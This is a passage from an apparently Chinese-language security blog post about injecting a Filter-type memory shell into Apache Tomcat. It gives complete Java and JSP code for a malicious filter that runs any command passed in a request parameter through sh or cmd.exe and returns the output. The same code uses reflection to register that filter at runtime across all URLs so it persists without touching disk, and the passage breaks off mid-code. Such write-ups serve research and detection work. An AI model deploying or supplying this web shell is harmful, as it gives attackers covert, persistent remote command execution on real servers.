title="Idea"></a>Idea</h3><p>动态注入Filter内存马的具体思路如下:</p><ul><li>调用ApplicationContext的addFilter方法创建filterDefs对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li><li>调用StandardContext的filterStart方法生成filterConfigs；</li><li>调用ApplicationFilterRegistration的addMappingForUrlPatterns生成filterMaps。</li></ul><p>同时，为了兼容某些特殊情况比如Shiro，需要将加入的filter放在filterMaps的第一位，可以自行修改HashMap中的顺序，也可以在调用StandardContext的addFilterMapBefore时直接加在filterMaps的第一位。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>先简单实现一个恶意的Filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;EvilFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osProperty</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osProperty != <span class="literal">null</span> &amp;&amp; osProperty.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            resp.getWriter().write(output);</span><br><span class="line">            resp.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/9.png"></p><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><p>根据上文的分析，动态注入filter型内存马需要经过以下步骤：</p><ul><li>创建恶意filter</li><li>用filterDef对filter进行封装</li><li>将filterDef添加到filterDefs跟filterConfigs中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中</li></ul><p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，因此内存马便可以一直驻留下去，直到Tomcat重启后失效。</p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;EvilServlet&quot;, value = &quot;/EvilServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取standardContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;h3rmesk1t&quot;</span>;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">filterConfigsMap</span> <span class="operator">=</span> (Map) filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置恶意的Filter</span></span><br><span class="line">            <span class="keyword">if</span> (filterConfigsMap.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                        <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            httpServletResponse.getWriter().write(output);</span><br><span class="line">                            httpServletResponse.getWriter().flush();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        chain.doFilter(request, response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取FilterDef, 设置filter名等参数, 调用addFilterDef添加FilterDef</span></span><br><span class="line">                Class&lt;?&gt; filterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();</span><br><span class="line">                filterDefDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef1</span> <span class="operator">=</span> (FilterDef) filterDefDeclaredConstructor.newInstance();</span><br><span class="line">                filterDef1.setFilter(filter);</span><br><span class="line">                filterDef1.setFilterName(filterName);</span><br><span class="line">                filterDef1.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardContext.addFilterDef(filterDef1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取FilterMap并设置拦截路径, 调用addFilterMapBefore添加FilterMap</span></span><br><span class="line">                Class&lt;?&gt; filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();</span><br><span class="line">                filterMapDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap1</span> <span class="operator">=</span> (FilterMap) filterMapDeclaredConstructor.newInstance();</span><br><span class="line">                filterMap1.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap1.setFilterName(filterName);</span><br><span class="line">                filterMap1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取ApplicationFilterConfig</span></span><br><span class="line">                Class&lt;?&gt; applicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                applicationFilterConfigDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig1</span> <span class="operator">=</span> (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 向从StandardContext获取的FilterConfigs中添加恶意的FilterConfig</span></span><br><span class="line">                filterConfigsMap.put(filterName, applicationFilterConfig1);</span><br><span class="line">                response.getWriter().write(<span class="string">&quot;Filter Inject Successfully...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/10.png"></p><p><img src="/2024/05/18/Tomcat-Filter/11.png"></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 通过反射获取standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;h3rmesk1t&quot;</span>;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigsMap</span> <span class="operator">=</span> (Map) filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置恶意的Filter</span></span><br><span class="line">    <span class="keyword">if</span> (filterConfigsMap.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;data&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    httpServletResponse.getWriter().write(output);</span><br><span class="line">                    httpServletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取FilterDef, 设置filter名等参数, 调用addFilterDef添加FilterDef</span></span><br><span class="line">        Class&lt;?&gt; filterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();</span><br><span class="line">        filterDefDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef1</span> <span class="operator">=</span> (FilterDef) filterDefDeclaredConstructor.newInstance();</span><br><span class="line">        filterDef1.setFilter(filter);</span><br><span class="line">        filterDef1.setFilterName(filterName);</span><br><span class="line">        filterDef1.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取FilterMap并设置拦截路径, 调用addFilterMapBefore添加FilterMap</span></span><br><span class="line">        Class&lt;?&gt; filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();</span><br><span class="line">        filterMapDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap1</span> <span class="operator">=</span> (FilterMap) filterMapDeclaredConstructor.newInstance();</span><br><span class="line">        filterMap1.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap1.setFilterName(filterName);</span><br><span class="line">        filterMap1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取ApplicationFilterConfig</span></span><br><span class="line">        Class&lt;?&gt; applicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        applicationFilterConfigDeclaredConstructor.setAccessible(<span 